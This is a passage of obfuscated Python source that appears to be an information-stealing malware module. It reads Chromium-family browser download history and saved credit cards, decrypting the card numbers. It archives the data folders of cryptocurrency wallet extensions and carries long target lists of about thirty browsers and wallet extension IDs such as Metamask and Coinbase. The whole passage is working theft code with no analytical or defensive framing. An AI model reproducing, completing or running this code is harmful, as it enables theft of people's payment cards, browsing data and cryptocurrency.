            UUFJBLSPDAOMYNLVGZGIIRHADUUXEAFTJTZJKHJRZBGPNBASEZKYBXKQNNJOAKILPMFTVVQCTGPLCNVALGF =         f"  Time    : {v4r_row[2]}"
            YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ_name = f"  Browser : {YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ}"
            LAOUUPDGHKFIQTNFJGCQQFRSLCEBBNBECXVGIFQELPZNQSWAZYPLLPKNVND.append(f"{QIQQXZIUPXYGTTWSJNFLCSLTUHCWHZLGKSZYJKRCPZDJYEBMSTTAJ}\n{KBDUZRMWIBODDUUAAWFQZAEJXPUAKWBNKGWATAWRCLBIRXVONZRVVCGSPUIRS}\n{UUFJBLSPDAOMYNLVGZGIIRHADUUXEAFTJTZJKHJRZBGPNBASEZKYBXKQNNJOAKILPMFTVVQCTGPLCNVALGF}\n{YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ_name}\n")
            LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK += 1

        MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL.close()
    
    def BPXSLIDAPQVUBKQKTSLBAHFUBCWGOZATPDNJYOGQVNLMNKLLMCJDSTDIGSQXKAMSSIBBCNMKTBLFZAPLROWSEJWBPLOKVAH(YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ, GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA):
        global THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF
        TFXMCZDVHRAAYZWOEWCTTYEVVBTYJOINGDDNJAWDVAOCSGPYFBSJGHZAMIZSXWUHKBQMHISFMQWU = os.path.join(GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA, 'History')
        if not os.path.exists(TFXMCZDVHRAAYZWOEWCTTYEVVBTYJOINGDDNJAWDVAOCSGPYFBSJGHZAMIZSXWUHKBQMHISFMQWU):
            return

        MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL = sqlite3.connect(":memory:")
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA = sqlite3.connect(TFXMCZDVHRAAYZWOEWCTTYEVVBTYJOINGDDNJAWDVAOCSGPYFBSJGHZAMIZSXWUHKBQMHISFMQWU)
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA.backup(MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL)
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA.close()
        TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH = MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL.cursor()
        TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH.execute('SELECT tab_url, target_path FROM downloads')
        for row in TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH.fetchall():
            if not row[0] or not row[1]:
                continue
            BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ =         f"- Path    : {row[1]}"
            QIQQXZIUPXYGTTWSJNFLCSLTUHCWHZLGKSZYJKRCPZDJYEBMSTTAJ =          f"  Url     : {row[0]}"
            YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ_name = f"  Browser : {YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ}"
            EUKOHSSNAEVMFEJPUFTRHQAMQNXAZDZFIGNZGIUOECWPYQQDSLG.append(f"{BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ}\n{QIQQXZIUPXYGTTWSJNFLCSLTUHCWHZLGKSZYJKRCPZDJYEBMSTTAJ}\n{YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ_name}\n")
            THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF += 1

        MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL.close()
    
    def ZJSKQHOIYLXGZCJCUEJNCPIWWWVELLMEFGHYWCIEHGDRAUKWXYSIRRHWMGXEZIQYPKT(YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ, GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA, HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV):
        global ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU
        VWNEUBIBIRWZBFXCFAHSGAHGRCIZKWIEPNOFFWHSBFPAQVQBIXALQSCR = os.path.join(GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA, 'Web Data')
        if not os.path.exists(VWNEUBIBIRWZBFXCFAHSGAHGRCIZKWIEPNOFFWHSBFPAQVQBIXALQSCR):
            return

        MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL = sqlite3.connect(":memory:")
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA = sqlite3.connect(VWNEUBIBIRWZBFXCFAHSGAHGRCIZKWIEPNOFFWHSBFPAQVQBIXALQSCR)
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA.backup(MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL)
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA.close()
        TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH = MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL.cursor()
        TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO =             f"- Name             : {v4r_row[0]}"
            ZGUVNCXTVDMSYCLKPZFCKKIQCEBBMVMWABUDVHMBBNIWJJAAXLEFHPNQFXAEVPGYZORQU = f"  Expiration Month : {v4r_row[1]}"
            IBAXKOVTDBDVIXOGVCDOTHVUYTNRCXXRXAIUZJQNXPRSCEVACDLRMYIJDNBOIMRXLSANWXPTYFIVLEADNQPKHEVUJWLW =  f"  Expiration Year  : {v4r_row[2]}"
            NJENTSOCAMAGEMFAZGGRDYVOGHENCIOXZOHGGDTGECATTKBFZEUCIFHVLBEORYUDHGETYAEQP =      f"  Card Number      : {LLJCTWGKIJYQVMPWMUJYNSNQTXFQCINYRKOHQCZBOILYICUYZPQVAHVRTHXNMOZHCTPEFRFUQPDNGMJVORGAUTLRQ(v4r_row[3], HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV)}"
            VLEGZLHWMALJQMSNVPESJPONBEXWVEYQIFOVLWVOPVRNCSQLOWAXAPUKJHVGLOSC =    f"  Date Modified    : {v4r_row[4]}"
            YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ_name =     f"  Browser          : {YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ}"
            WEMCBNBUNERKUMWGGHRPWNOQYUBNJQAOTVUUBWJCLVKZFJAQVFRNIJYWXDEMJOGXNNPNLNPBGTGOJBLJQMPJELYKVEFJ.append(f"{VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO}\n{ZGUVNCXTVDMSYCLKPZFCKKIQCEBBMVMWABUDVHMBBNIWJJAAXLEFHPNQFXAEVPGYZORQU}\n{IBAXKOVTDBDVIXOGVCDOTHVUYTNRCXXRXAIUZJQNXPRSCEVACDLRMYIJDNBOIMRXLSANWXPTYFIVLEADNQPKHEVUJWLW}\n{NJENTSOCAMAGEMFAZGGRDYVOGHENCIOXZOHGGDTGECATTKBFZEUCIFHVLBEORYUDHGETYAEQP}\n{VLEGZLHWMALJQMSNVPESJPONBEXWVEYQIFOVLWVOPVRNCSQLOWAXAPUKJHVGLOSC}\n{YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ_name}\n")
            ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU += 1
        
        MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL.close()

    def HUTUHEYNIARRHHIKAXAFQLNMLMRFWPCWXMSZKWHXTQONBFKKUZOOYAT(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW, IRGHKOHKYGJFNAOZIRQSXOWISZHXKDFMEYEZNNIYPXTNOQYVBMXCKVFWFFKKFDCLVQLGUWUHIFXMWXBESFORRIBDIPGXRL, YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ, GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA):
        global WJVLHCGOFLUZAXIPYBORMGLZDJDOMTNQIDVETIHIKARLYPTYRQ
        VLFRJBNDAMNJIPEXIOFZJRZPMLYYEWXARPPMDOPNDMGZKSRJGHOCWYYIWRUCIOUSGTFHLRVMLF = os.path.join(GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA, 'Extensions')
        YSCHFWGXUUIOZRNSHBWOZJCQDAVOUVICZKGZZTCRNDDYGBGACL = os.path.join("Extensions", YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ)

        if not os.path.exists(VLFRJBNDAMNJIPEXIOFZJRZPMLYYEWXARPPMDOPNDMGZKSRJGHOCWYYIWRUCIOUSGTFHLRVMLF):
            return 

        NBFDSECYHPGPWDMNEFTAWQICYUOZPEJCHJCVUIVHBHBKIYKGXPTGRJUDRCNVPRBBLRNWRQZRMVFBNGJRAD = [v4r_item for v4r_item in os.listdir(VLFRJBNDAMNJIPEXIOFZJRZPMLYYEWXARPPMDOPNDMGZKSRJGHOCWYYIWRUCIOUSGTFHLRVMLF) if os.path.isdir(os.path.join(VLFRJBNDAMNJIPEXIOFZJRZPMLYYEWXARPPMDOPNDMGZKSRJGHOCWYYIWRUCIOUSGTFHLRVMLF, v4r_item))]
        
        for RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKRention in NBFDSECYHPGPWDMNEFTAWQICYUOZPEJCHJCVUIVHBHBKIYKGXPTGRJUDRCNVPRBBLRNWRQZRMVFBNGJRAD:
            if "Temp" in RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKRention:
                continue
            
            WJVLHCGOFLUZAXIPYBORMGLZDJDOMTNQIDVETIHIKARLYPTYRQ += 1
            UEKDMFIACJTTPLGMSTJHIAJGLLYFGUDBQMWLJWFVWJVZJIIZZZDAVHGRKKLLCAGRKZPVVC = False
            
            for RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKRension_name, RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKRension_folder in IRGHKOHKYGJFNAOZIRQSXOWISZHXKDFMEYEZNNIYPXTNOQYVBMXCKVFWFFKKFDCLVQLGUWUHIFXMWXBESFORRIBDIPGXRL:
                if RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKRention == RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKRension_folder:
                    UEKDMFIACJTTPLGMSTJHIAJGLLYFGUDBQMWLJWFVWJVZJIIZZZDAVHGRKKLLCAGRKZPVVC = True
                    
                    XNJJDWIRYWBJFNRDZMSRMYKTFSFLTLLWELXLHSASVTNZCRHYPFZDMWOQQXRABGXTOWOFITWLWZKTHSMIXOLJZBYDWCCHZBYESHED = os.path.join(YSCHFWGXUUIOZRNSHBWOZJCQDAVOUVICZKGZZTCRNDDYGBGACL, RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKRension_name, RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKRention)
                    
                    XREPCLPDNCXBBMHUHNHMPPYRULLIRURWQJTYECCGCDDVTVAASANPQCQTOYWGLXHNXZKQPFJBNFPGVOHNZQUGKJCCJRZ = os.path.join(VLFRJBNDAMNJIPEXIOFZJRZPMLYYEWXARPPMDOPNDMGZKSRJGHOCWYYIWRUCIOUSGTFHLRVMLF, RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKRention)
                    for v4r_item in os.listdir(XREPCLPDNCXBBMHUHNHMPPYRULLIRURWQJTYECCGCDDVTVAASANPQCQTOYWGLXHNXZKQPFJBNFPGVOHNZQUGKJCCJRZ):
                        NYUHAVSAQNEEFAFGBCDFYAOKKUNWFUPVUOSXUAUFUWPINHYIQLJKLI = os.path.join(XREPCLPDNCXBBMHUHNHMPPYRULLIRURWQJTYECCGCDDVTVAASANPQCQTOYWGLXHNXZKQPFJBNFPGVOHNZQUGKJCCJRZ, v4r_item)
                        
                        if os.path.isdir(NYUHAVSAQNEEFAFGBCDFYAOKKUNWFUPVUOSXUAUFUWPINHYIQLJKLI):
                            for dirpath, dirnames, filenames in os.walk(NYUHAVSAQNEEFAFGBCDFYAOKKUNWFUPVUOSXUAUFUWPINHYIQLJKLI):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
                                    arcname = os.path.relpath(file_path, XREPCLPDNCXBBMHUHNHMPPYRULLIRURWQJTYECCGCDDVTVAASANPQCQTOYWGLXHNXZKQPFJBNFPGVOHNZQUGKJCCJRZ)
                                    KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.write(file_path, os.path.join(XNJJDWIRYWBJFNRDZMSRMYKTFSFLTLLWELXLHSASVTNZCRHYPFZDMWOQQXRABGXTOWOFITWLWZKTHSMIXOLJZBYDWCCHZBYESHED, arcname))
                        else:
                            KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.write(NYUHAVSAQNEEFAFGBCDFYAOKKUNWFUPVUOSXUAUFUWPINHYIQLJKLI, os.path.join(XNJJDWIRYWBJFNRDZMSRMYKTFSFLTLLWELXLHSASVTNZCRHYPFZDMWOQQXRABGXTOWOFITWLWZKTHSMIXOLJZBYDWCCHZBYESHED, v4r_item))
                    break

            if not UEKDMFIACJTTPLGMSTJHIAJGLLYFGUDBQMWLJWFVWJVZJIIZZZDAVHGRKKLLCAGRKZPVVC:
                UITAGMPPZYENDNDWYZDKYTROXBFFHQZZNFJSHKEZCQRLUZTVFJGHLHNAAPMDXEHYIOOIGWEQAKPP = os.path.join(YSCHFWGXUUIOZRNSHBWOZJCQDAVOUVICZKGZZTCRNDDYGBGACL, "Unknown Extension", RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKRention)
                
                XREPCLPDNCXBBMHUHNHMPPYRULLIRURWQJTYECCGCDDVTVAASANPQCQTOYWGLXHNXZKQPFJBNFPGVOHNZQUGKJCCJRZ = os.path.join(VLFRJBNDAMNJIPEXIOFZJRZPMLYYEWXARPPMDOPNDMGZKSRJGHOCWYYIWRUCIOUSGTFHLRVMLF, RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKRention)
                for v4r_item in os.listdir(XREPCLPDNCXBBMHUHNHMPPYRULLIRURWQJTYECCGCDDVTVAASANPQCQTOYWGLXHNXZKQPFJBNFPGVOHNZQUGKJCCJRZ):
                    NYUHAVSAQNEEFAFGBCDFYAOKKUNWFUPVUOSXUAUFUWPINHYIQLJKLI = os.path.join(XREPCLPDNCXBBMHUHNHMPPYRULLIRURWQJTYECCGCDDVTVAASANPQCQTOYWGLXHNXZKQPFJBNFPGVOHNZQUGKJCCJRZ, v4r_item)
                    
                    if os.path.isdir(NYUHAVSAQNEEFAFGBCDFYAOKKUNWFUPVUOSXUAUFUWPINHYIQLJKLI):
                        for dirpath, dirnames, filenames in os.walk(NYUHAVSAQNEEFAFGBCDFYAOKKUNWFUPVUOSXUAUFUWPINHYIQLJKLI):
                            for filename in filenames:
                                file_path = os.path.join(dirpath, filename)
                                arcname = os.path.relpath(file_path, XREPCLPDNCXBBMHUHNHMPPYRULLIRURWQJTYECCGCDDVTVAASANPQCQTOYWGLXHNXZKQPFJBNFPGVOHNZQUGKJCCJRZ)
                                KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.write(file_path, os.path.join(UITAGMPPZYENDNDWYZDKYTROXBFFHQZZNFJSHKEZCQRLUZTVFJGHLHNAAPMDXEHYIOOIGWEQAKPP, arcname))
                    else:
                        KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.write(NYUHAVSAQNEEFAFGBCDFYAOKKUNWFUPVUOSXUAUFUWPINHYIQLJKLI, os.path.join(UITAGMPPZYENDNDWYZDKYTROXBFFHQZZNFJSHKEZCQRLUZTVFJGHLHNAAPMDXEHYIOOIGWEQAKPP, v4r_item))

    YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ_files = [
        ("Google Chrome",          os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
        ("Google Chrome SxS",      os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
        ("Google Chrome Beta",     os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
        ("Google Chrome Dev",      os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
        ("Google Chrome Unstable", os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
        ("Google Chrome Canary",   os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
        ("Microsoft Edge",         os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
        ("Opera",                  os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "Opera Software", "Opera Stable"),                "opera.exe"),
        ("Opera GX",               os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "Opera Software", "Opera GX Stable"),             "opera.exe"),
        ("Opera Neon",             os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "Opera Software", "Opera Neon"),                  "opera.exe"),
        ("Brave",                  os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
        ("Vivaldi",                os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
        ("Internet Explorer",      os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
        ("Amigo",                  os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Amigo", "User Data"),                            "amigo.exe"),
        ("Torch",                  os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Torch", "User Data"),                            "torch.exe"),
        ("Kometa",                 os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Kometa", "User Data"),                           "kometa.exe"),
        ("Orbitum",                os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Orbitum", "User Data"),                          "orbitum.exe"),
        ("Cent Browser",           os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
        ("7Star",                  os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "7Star", "7Star", "User Data"),                   "7star.exe"),
        ("Sputnik",                os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
        ("Epic Privacy Browser",   os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
        ("Uran",                   os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
        ("Yandex",                 os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
        ("Yandex Canary",          os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
        ("Yandex Developer",       os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
        ("Yandex Beta",            os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
        ("Yandex Tech",            os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
        ("Yandex SxS",             os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
        ("Iridium",                os.path.join(CPTWNCGNFOGUMPYBIFICJRDOOTZUGSSSOQEIEZSUQLYCPEGDPAXSGLQTVLHRCFNGSDIMZUXPWTZSXU,   "Iridium", "User Data"),                          "iridium.exe"),
        ("Mozilla Firefox",        os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
        ("Safari",                 os.path.join(SDURXBHFCAQHRZPXSLMXGNJRMLRLOPMSLQDUPDCEQRWTSZNPBSYIYWZWSSRDCX, "Apple Computer", "Safari"),                      "safari.exe"),
    ]

    PPJDIAIFUMNKFAPSUKCVVZBNOFVXZQXCPCZONUAOATARWTOLSYECZMZPAYKYDGHVCSJCNNSORQSAHVMODPHB = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    IRGHKOHKYGJFNAOZIRQSXOWISZHXKDFMEYEZNNIYPXTNOQYVBMXCKVFWFFKKFDCLVQLGUWUHIFXMWXBESFORRIBDIPGXRL = [
        ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
        ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
        ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
        ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
        ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
        ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
        ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
        ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
        ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
